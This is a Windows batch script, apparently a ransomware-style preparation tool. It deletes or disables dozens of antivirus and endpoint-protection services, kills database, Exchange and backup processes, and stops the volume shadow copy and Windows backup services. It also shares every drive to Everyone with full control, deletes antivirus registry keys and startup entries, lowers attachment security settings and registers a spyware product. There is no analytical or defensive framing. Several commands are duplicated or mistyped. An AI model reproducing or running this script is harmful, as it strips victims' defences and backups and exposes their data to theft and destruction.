@echo off
rem Delite Service "Hyper-V"
sc delete "vmickvpexchange"
sc delete "vmicguestinterface"
sc delete "vmicshutdown"
sc delete "vmicheartbeat"
sc delete "vmicrdv"
sc delete "storflt"
sc delete "vmictimesync"
sc delete "vmicvss"
sc delete "hvdsvc"
sc delete "nvspwmi"
sc delete "wmms"

rem Delite Service "AVG"
sc delete "AvgAdminServer"
sc delete "AVG Antivirus"
sc delete "avgAdminClient"

rem Delite Service "Sofos"
sc delete "SAVService"
sc delete "SAVAdminService"
sc delete "Sophos AutoUpdate Service"
sc delete "Sophos Clean Service"
sc delete "Sophos Device Control Service"
sc delete "Sophos Endpoint Defense Service"
sc delete "Sophos File Scanner Service"
sc delete "Sophos Health Service"
sc delete "Sophos MCS Agent"
sc delete "Sophos MCS Client"
sc delete "SntpService"
sc delete "swc_service"
sc delete "swi_service"
sc delete "Sophos UI"
sc delete "swi_update"
sc delete "Sophos Web Control Service"
sc delete "Sophos System Protection Service"
sc delete "Sophos Safestore Service"
sc delete "hmpalertsvc"
sc delete "RpcEptMapper"
sc delete "Sophos Endpoint Defense Service"
sc delete "SophosFIM"
sc delete "swi_filter"

rem Delite Service "Fire_Bird"
sc delete "FirebirdGuardianDefaultInstance"
sc delete "FirebirdServerDefaultInstance"

rem Delite Service "SQL"
sc delete "MSSQLFDLauncher"
sc delete "MSSQLSERVER"
sc delete "SQLSERVERAGENT"
sc delete "SQLBrowser"
sc delete "SQLTELEMETRY"
sc delete "MsDtsServer130"
sc delete "SSISTELEMETRY130"
sc delete "SQLWriter"
sc delete "MSSQL$VEEAMSQL2012"
sc delete "SQLAgent$VEEAMSQL2012"
sc delete "MSSQL"
sc delete "SQLAgent"
sc delete "MSSQLServerADHelper100"
sc delete "MSSQLServerOLAPService"
sc delete "MsDtsServer100"
sc delete "ReportServer"
sc delete "SQLTELEMETRY$HL"
sc delete "TMBMServer"
sc delete "MSSQL$PROGID"
sc delete "MSSQL$WOLTERSKLUWER"
sc delete "SQLAgent$PROGID"
sc delete "SQLAgent$WOLTERSKLUWER"
sc delete "MSSQLFDLauncher$OPTIMA"
sc delete "MSSQL$OPTIMA"
sc delete "SQLAgent$OPTIMA"
sc delete "ReportServer$OPTIMA"
sc delete "msftesql$SQLEXPRESS"
sc delete "postgresql-x64-9.4"


rem Delite Service "AV: Webroot"
sc delete "WRSVC"

rem Delite Service "AV: ESET"
sc delete "ekrn"
sc delete "ekrnEpsw"

rem Delite Service "AV: Kaspersky"
sc delete "klim6"
sc delete "AVP18.0.0"
sc delete "KLIF"
sc delete "klpd"
sc delete "klflt"
sc delete "klbackupdisk"
sc delete "klbackupflt"
sc delete "klkbdflt"
sc delete "klmouflt"
sc delete "klhk"
sc delete "KSDE1.0.0"
sc delete "kltap"

rem Delite Service "AV: Quick Heal"
sc delete "ScSecSvc"
sc delete "Core Mail Protection"
sc delete "Core Scanning Server"
sc delete "Core Scanning ServerEx"
sc delete "Online Protection System"
sc delete "RepairService"
sc delete "Core Browsing Protection"
sc delete "Quick Update Service"

rem Delite Service "AV: McAfee"
sc delete "McAfeeFramework"
sc delete "macmnsvc"
sc delete "masvc"
sc delete "mfemms"
sc delete "mfevtp"

rem Delite Service "AV: Trend Micro"
sc delete "TmFilter"
sc delete "TMLWCSService"
sc delete "tmusa"
sc delete "TmPreFilter"
sc delete "TMSmartRelayService"
sc delete "TMiCRCScanService"
sc delete "VSApiNt"
sc delete "TmCCSF"
sc delete "tmlisten"
sc delete "TmProxy"
sc delete "ntrtscan"
sc delete "ofcservice"
sc delete "TmPfw"
sc delete "PccNTUpd"

rem Delite Service "AV: Panda"
sc delete "PandaAetherAgent"
sc delete "PSUAService"
sc delete "NanoServiceMain"

rem Delite Service "AV: Panda"
sc delete "EPIntegrationService"
sc delete "EPProtectedService"
sc delete "EPRedline"
sc delete "EPSecurityService"
sc delete "EPUpdateService"

rem Kill
sc delete "UniFi"

rem Kill "AV: Trend Micro"
taskkill -f -im PccNTMon.exe
taskkill -f -im NTRtScan.exe
taskkill -f -im TmListen.exe
taskkill -f -im TmCCSF.exe
taskkill -f -im TmProxy.exe
taskkill -f -im TMBMSRV.exe
taskkill -f -im TMBMSRV.exe
taskkill -f -im TmPfw.exe
taskkill -f -im CNTAoSMgr.exe


rem Kill "SQL"
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe


rem Kill
taskkill -f -im UniFi.exe

net stop MSSQLSERVER
sc config MSSQLSERVER start= disabled
net stop "SQL Server (MSSQLSERVER)"
sc config "SQL Server (MSSQLSERVER)" start= disabled
net stop MSSQL$
sc config MSSQL$ start= disabled
net stop SQLSERVERAGENT
sc config SQLSERVERAGENT start= disabled
net stop SQLBrowser
sc config SQLBrowser start= disabled
net stop vss
sc config vss start= disabled
net stop SQLWriter
sc config SQLWriter start= disabled
net stop vmvss
sc config vmvss start= disabled
net stop MSSQL$FE_EXPRESS
sc config MSSQL$FE_EXPRESS start= disabled
net stop MSSQL$RE_EXPRESS
sc config MSSQL$RE_EXPRESS start= disabled
net stop SQLANYs_Sage_FAS_Fixed_Assets 
sc config SQLANYs_Sage_FAS_Fixed_Assets start= disabled
net stop MSSQL$VIM_SQLEXP
sc config MSSQL$VIM_SQLEXP start= disabled
net stop "MSSQLFDLauncher"
net stop "MSSQLSERVER"
net stop "SQLSERVERAGENT"
net stop "SQLBrowser"
net stop "SQLTELEMETRY"
net stop "MsDtsServer130"
net stop "SSISTELEMETRY130"
net stop "SQLWriter"
net stop "MSSQL$VEEAMSQL2012"
net stop "SQLAgent$VEEAMSQL2012"
net stop "MSSQL"
net stop "SQLAgent"
net stop "MSSQLServerADHelper100"
net stop "MSSQLServerOLAPService"
net stop "MsDtsServer100"
net stop "ReportServer"
net stop "SQLTELEMETRY$HL"
net stop "TMBMServer"
net stop "MSSQL$PROGID"
net stop "MSSQL$WOLTERSKLUWER"
net stop "SQLAgent$PROGID"
net stop "SQLAgent$WOLTERSKLUWER"
net stop "MSSQLFDLauncher$OPTIMA"
net stop "MSSQL$OPTIMA"
net stop "SQLAgent$OPTIMA"
net stop "ReportServer$OPTIMA"
net stop "msftesql$SQLEXPRESS"
net stop "postgresql-x64-9.4"
sc config "MSSQLFDLauncher" start= disabled 
sc config "MSSQLSERVER" start= disabled 
sc config "SQLSERVERAGENT" start= disabled 
sc config "SQLBrowser" start= disabled 
sc config "SQLTELEMETRY" start= disabled 
sc config "MsDtsServer130" start= disabled 
sc config "SSISTELEMETRY130" start= disabled 
sc config "SQLWriter" start= disabled 
sc config "MSSQL$VEEAMSQL2012" start= disabled 
sc config "SQLAgent$VEEAMSQL2012" start= disabled 
sc config "MSSQL" start= disabled 
sc config "SQLAgent" start= disabled 
sc config "MSSQLServerADHelper100" start= disabled 
sc config "MSSQLServerOLAPService" start= disabled 
sc config "MsDtsServer100" start= disabled 
sc config "ReportServer" start= disabled 
sc config "SQLTELEMETRY$HL" start= disabled 
sc config "TMBMServer" start= disabled 
sc config "MSSQL$PROGID" start= disabled 
sc config "MSSQL$WOLTERSKLUWER" start= disabled 
sc config "SQLAgent$PROGID" start= disabled 
sc config "SQLAgent$WOLTERSKLUWER" start= disabled 
sc config "MSSQLFDLauncher$OPTIMA" start= disabled 
sc config "MSSQL$OPTIMA" start= disabled 
sc config "SQLAgent$OPTIMA" start= disabled 
sc config "ReportServer$OPTIMA" start= disabled 
sc config "msftesql$SQLEXPRESS" start= disabled 
sc config "postgresql-x64-9.4" start= disabled 
net stop MSDTC
sc config MSDTC start= disabled
net stop vmicvss
sc config vmicvss start= disabled
net stop HostControllerService
sc config HostControllerService start= disabled
net stop MSComplianceAudit
sc config MSComplianceAudit start= disabled
net stop MSExchangeADTopology
sc config MSExchangeADTopology start= disabled
net stop MSExchangeAntispamUpdate
sc config MSExchangeAntispamUpdate start= disabled
net stop MSExchangeCompliance
sc config MSExchangeCompliance start= disabled
net stop MSExchangeDagMgmt
sc config MSExchangeDagMgmt start= disabled
net stop MSExchangeDelivery
sc config MSExchangeDelivery start= disabled
net stop MSExchangeDiagnostics
sc config MSExchangeDiagnostics start= disabled
net stop MSExchangeEdgeSync
sc config MSExchangeEdgeSync start= disabled
net stop MSExchangeFastSearch
sc config MSExchangeFastSearch start= disabled
net stop MSExchangeFrontEndTransport
sc config MSExchangeFrontEndTransport start= disabled
net stop MSExchangeHM
sc config MSExchangeHM start= disabled
net stop MSExchangeHMRecovery
sc config MSExchangeHMRecovery start= disabled
net stop MSExchangeImap4
sc config MSExchangeImap4 start= disabled
net stop MSExchangeIMAP4BE
sc config MSExchangeIMAP4BE start= disabled
net stop MSExchangeIS
sc config MSExchangeIS start= disabled
net stop MSExchangeMailboxAssistants
sc config MSExchangeMailboxAssistants start= disabled
net stop MSExchangeMailboxReplication
sc config MSExchangeMailboxReplication start= disabled
net stop MSExchangeNotificationsBroker
sc config MSExchangeNotificationsBroker start= disabled
net stop MSExchangePop3
sc config MSExchangePop3 start= disabled
net stop MSExchangePOP3BE
sc config MSExchangePOP3BE start= disabled
net stop MSExchangeRepl
sc config MSExchangeRepl start= disabled
net stop MSExchangeRPC
sc config MSExchangeRPC start= disabled
net stop MSExchangeServiceHost
sc config MSExchangeServiceHost start= disabled
net stop MSExchangeSubmission
sc config MSExchangeSubmission start= disabled
net stop MSExchangeThrottling
sc config MSExchangeThrottling start= disabled
net stop MSExchangeTransport
sc config MSExchangeTransport start= disabled
net stop MSExchangeTransportLogSearch
sc config MSExchangeTransportLogSearch start= disabled
net stop MSExchangeUM
sc config MSExchangeUM start= disabled
net stop MSExchangeUMCR
sc config MSExchangeUMCR start= disabled
net stop SearchExchangeTracing
sc config SearchExchangeTracing start= disabled
net stop wsbexchange
sc config wsbexchange start= disabled
net stop IISADMIN
sc config IISADMIN start= disabled
net stop Tomcat8_CLOUDERP
sc config Tomcat8_CLOUDERP start= disabled
net stop Tomcat8_DESARROLLO221
sc config Tomcat8_DESARROLLO221 start= disabled
net stop TeamViewer
sc config TeamViewer start= disabled 
net stop vds
sc config vds start= disabled
net	stop MSSQLServerADHelper
sc config MSSQLServerADHelper start= disabled
net stop Tomcat5
sc config Tomcat5 start= disabled
net stop ibmspsvc
sc stop ibmspsvc start= disabled
net stop IBMHPS
sc stop IBMHPS start= disabled
net stop SDRSVC
sc stop SDRSVC start= disabled
net stop wbengine
sc stop wbengine start= disabled
net stop CASLicenceServer
sc stop CASLicenceServer start= disabled
net stop CASWebServer
sc stop CASWebServer start= disabled
net stop OracleMTSRecoveryService
sc stop OracleMTSRecoveryService start= disabled
net stop WPFFontCache_v0400
sc stop WPFFontCache_v0400 start= disabled
net stop Apache4U8AppServer
sc stop Apache4U8AppServer start= disabled
net stop Apache4TurboCRM70
sc stop Apache4TurboCRM70 start= disabled
net stop UFNet
sc stop UFNet start= disabled
net stop NetTcpPortSharing
sc stop NetTcpPortSharing start= disabled
net stop NetTcpActivator
sc stop NetTcpActivator start= disabled
net stop NetPipeActivator
sc stop NetPipeActivator start= disabled
net stop NetMsmqActivator
sc stop NetMsmqActivator start= disabled
net stop VMTools
sc stop VMTools start= disabled
net stop AHS Service
sc stop AHS Service start= disabled
net stop MySQL
sc stop MySQL start= disabled
net stop OracleVssWriterORCL
sc stop OracleVssWriterORCL start= disabled
net stop OracleVssWriterBIEE
sc stop OracleVssWriterBIEE start= disabled
net stop MsDtsServer100
sc stop MsDtsServer100 start= disabled
net stop MSSQLFDLauncher
sc stop MSSQLFDLauncher start= disabled
net stop MSSQLServerOLAPService
sc stop MSSQLServerOLAPService start= disabled
net stop ReportServer
sc stop ReportServer strat= disabled
net stop OracleDBConsolebiee
sc stop OracleDBConsolebiee start= disabled
net stop OracleDBConsoleorcl
sc stop OracleDBConsoleorcl start= disabled
net stop OracleMTSRecoveryService
sc stop OracleMTSRecoveryService start= disabled
net stop OracleOraDb11g_home1ClrAgent
sc stop OracleOraDb11g_home1ClrAgent start= disabled
net stop OracleOraDb11g_home1TNSListener
sc stop OracleOraDb11g_home1TNSListener start= disabled
net stop OracleServiceBIEE
sc stop OracleServiceBIEE start= disabled
net stop OracleServiceORCL
sc stop OracleServiceORCL start= disabled
net stop Tomcat7
sc stop Tomcat7 start= disabled
net stop UFNet
sc stop UFNet start= disabled
net stop Apache4TurboCRM70
sc stop Apache4TurboCRM70 start= disabled
net stop MsDtsServer110
sc stop MsDtsServer110 start= disabled
net stop Tomcat8
sc stop Tomcat8 start= disabled
net stop osppsvc
sc stop osppsvc start= disabled
net stop instance2
sc stop instance2 start= disabled
net stop IAStorDataMgrSvc
sc stop IAStorDataMgrSvc start= disabled
net stop AdobeARMservice
sc stop AdobeARMservice start= disabled
net stop FontCache3.0.0.0
sc stop FontCache3.0.0.0 start= disabled
net stop MSSQLLaunchpad$SQLEXPRESS
sc stop MSSQLLaunchpad$SQLEXPRESS start= disabled
nst stop OracleVssWriterORCL
sc stop OracleVssWriterORCL start= disabled
net stop Tomcat6
sc stop Tomcat6 start= disabled
net stop dwmrcs
sc stop dwmrcs start= disabled
net stop SQL Server Analysis Services CEIP (MSSQLSERVER)
sc stop SQL Server Analysis Services CEIP (MSSQLSERVER) start= disabled





taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe 
taskkill -f -im	SMSvcHost.exe


@echo off
rem Delite Service "Hyper-V"
sc delete "vmickvpexchange"
sc delete "vmicguestinterface"
sc delete "vmicshutdown"
sc delete "vmicheartbeat"
sc delete "vmicrdv"
sc delete "storflt"
sc delete "vmictimesync"
sc delete "vmicvss"

rem Delite Service "SQL"
sc delete "MSSQLFDLauncher"
sc delete "MSSQLSERVER"
sc delete "SQLSERVERAGENT"
sc delete "SQLBrowser"
sc delete "SQLTELEMETRY"
sc delete "MsDtsServer130"
sc delete "SSISTELEMETRY130"
sc delete "SQLWriter"
sc delete "MSSQL$VEEAMSQL2012"
sc delete "SQLAgent$VEEAMSQL2012"
sc delete "MSSQL"
sc delete "SQLAgent"
sc delete "MSSQLServerADHelper100"
sc delete "MSSQLServerOLAPService"
sc delete "MsDtsServer100"
sc delete "ReportServer"
sc delete "SQLTELEMETRY$HL"
sc delete "TMBMServer"
sc delete "MSSQL$PROGID"
sc delete "MSSQL$WOLTERSKLUWER"
sc delete "SQLAgent$PROGID"
sc delete "SQLAgent$WOLTERSKLUWER"
sc delete "MSSQLFDLauncher$OPTIMA"
sc delete "MSSQL$OPTIMA"
sc delete "SQLAgent$OPTIMA"
sc delete "ReportServer$OPTIMA"
sc delete "msftesql$SQLEXPRESS"
sc delete "postgresql-x64-9.4"


rem Delite Service "AV: Webroot"
sc delete "WRSVC"

rem Delite Service "AV: ESET"
sc delete "ekrn"

rem Delite Service "AV: Kaspersky"
sc delete "klim6"
sc delete "AVP18.0.0"
sc delete "KLIF"
sc delete "klpd"
sc delete "klflt"
sc delete "klbackupdisk"
sc delete "klbackupflt"
sc delete "klkbdflt"
sc delete "klmouflt"
sc delete "klhk"
sc delete "KSDE1.0.0"
sc delete "kltap"

rem Delite Service "AV: Trend Micro"
sc delete "TmFilter"
sc delete "TMLWCSService"
sc delete "tmusa"
sc delete "TmPreFilter"
sc delete "TMSmartRelayService"
sc delete "TMiCRCScanService"
sc delete "VSApiNt"
sc delete "TmCCSF"
sc delete "tmlisten"
sc delete "TmProxy"
sc delete "ntrtscan"
sc delete "ofcservice"

rem Kill
sc delete "UniFi"


rem Kill "SQL"
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe


rem Kill
taskkill -f -im UniFi.exe


@echo off
net share c=c:\ /GRANT:Everyone,FULL
net share d=d:\ /GRANT:Everyone,FULL
net share e=e:\ /GRANT:Everyone,FULL
net share g=g:\ /GRANT:Everyone,FULL
net share f=f:\ /GRANT:Everyone,FULL
net share i=i:\ /GRANT:Everyone,FULL
net share e=e:\ /GRANT:Everyone,FULL
net share h=h:\ /GRANT:Everyone,FULL
net share j=j:\ /GRANT:Everyone,FULL
net share k=k:\ /GRANT:Everyone,FULL
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\KSDE2.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\KSDE1.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP18.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP17.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP16.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP15.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP14.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP13.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP12.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP11.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP10.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\MBAMService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAWFwk" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\MSK80Service" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAPExe" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McBootDelayStartSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mccspsvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfefire" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\HomeNetSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ModuleCoreService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McMPFSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mcpltsvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McProxy" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McODS" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfemms" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAfee SiteAdvisor Service" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfevtp" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McNaiAnn" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\nanosvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\NortonSecurity" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\!SASCORE" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\SBAMSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ZillyaAVAuxSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ZillyaAVCoreSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\QHActiveDefense" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\avast! Antivirus" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\avast! Firewall" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVG Antivirus" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirMailService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\Avira.ServiceHost" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirWebService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirSchedulerService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\vsservppl" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ProductAgentService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\vsserv" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\updatesrv" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\cmdAgent" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\cmdvirth" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\DragonUpdater" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ekrn" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\0247141531883172mcinstcleanup" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\PEFService" /f
set "osX=%PROCESSOR_ARCHITECTURE%"
if defined PROCESSOR_ARCHITEW6432 set "osX=AMD64"
if "%osX%"=="x86" (
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t REG_DWORD /d "24914" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".zip;.rar;.nfo;.txt;.exe;.bat;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "HideZoneInfoOnProperties" /t REG_DWORD /d "1" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d "2" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "DisplayName" /t REG_SZ /d "RelevantKnowledge" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "UninstallString" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg.exe -bootremove -uninst:RelevantKnowledge" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK_Path" /t REG_SZ /d "%windir%\system32\rlls.dll" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK64_Path" /t REG_SZ /d "%windir%\system32\rlls64.dll" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "LD64_Path" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg64.exe" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "KS_Path" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlls.dll" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "SV_Path" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlservice.exe" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy" /v "" /t REG_SZ /d "" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RunLine" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg.exe -boot" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "ServiceName" /t REG_SZ /d "RelevantKnowledge" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "UninstURL" /t REG_SZ /d "http://www.relevantknowledge.com/confirmuninstall.aspx?siteid=2600&campaign_id=794" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RevertPath" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBRegRebootCleaner" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f
Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f
) else (
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t REG_DWORD /d "24914" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".zip;.rar;.nfo;.txt;.exe;.bat;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "HideZoneInfoOnProperties" /t REG_DWORD /d "1" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d "2" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "DisplayName" /t REG_SZ /d "RelevantKnowledge" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "UninstallString" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg.exe -bootremove -uninst:RelevantKnowledge" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK_Path" /t REG_SZ /d "%windir%\system32\rlls.dll" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK64_Path" /t REG_SZ /d "%windir%\system32\rlls64.dll" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "LD64_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg64.exe" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "KS_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlls.dll" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "SV_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlservice.exe" /f /reg:32
